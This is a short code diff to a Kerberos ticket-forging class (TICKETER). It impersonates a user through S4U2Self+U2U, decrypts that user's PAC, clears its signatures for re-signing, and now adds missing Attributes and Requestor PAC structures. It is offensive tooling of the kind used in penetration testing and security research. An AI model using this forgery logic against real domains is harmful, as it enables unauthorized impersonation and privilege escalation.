@@ -604,7 +604,6 @@ class TICKETER:
             # 1. S4U2Self + U2U
             logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
             tgs, cipher, oldSessionKey, sessionKey = self.getKerberosS4U2SelfU2U()
-            self.saveTicket(tgs, sessionKey)
 
             # 2. extract PAC
             logging.info('\tDecrypting ticket & extracting PAC')
@@ -626,6 +625,8 @@ class TICKETER:
             buff = pacType['Buffers']
 
             # clearing the signatures so that we can sign&encrypt later on
+            AttributesInfoPacInS4UU2UPAC = False
+            RequestorInfoPacInS4UU2UPAC = False
             logging.info("\tClearing signatures")
             for bufferN in range(pacType['cBuffers']):
                 infoBuffer = pac.PAC_INFO_BUFFER(buff)
@@ -640,8 +641,20 @@ class TICKETER:
                     else:
                         checksum['Signature'] = '\x00' * 16
                     pacInfos[infoBuffer['ulType']] = checksum.getData()
+                elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
+                    AttributesInfoPacInS4UU2UPAC = True
+                    pacInfos[infoBuffer['ulType']] = data
+                elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
+                    RequestorInfoPacInS4UU2UPAC = True
+                    pacInfos[infoBuffer['ulType']] = data
                 else:
                     pacInfos[infoBuffer['ulType']] = data
+
+            # adding the Requestor and Attributes structures manually if they were not in the S4U2self+U2U ticket's PAC
+            if self.__options.old_pac is False and not AttributesInfoPacInS4UU2UPAC:
+                self.createAttributesInfoPac(pacInfos)
+            if self.__options.old_pac is False and not RequestorInfoPacInS4UU2UPAC:
+                self.createRequestorInfoPac(pacInfos)
 
             # changing ticket flags to match TGT / ST
             logging.info("\tAdding necessary ticket flags")
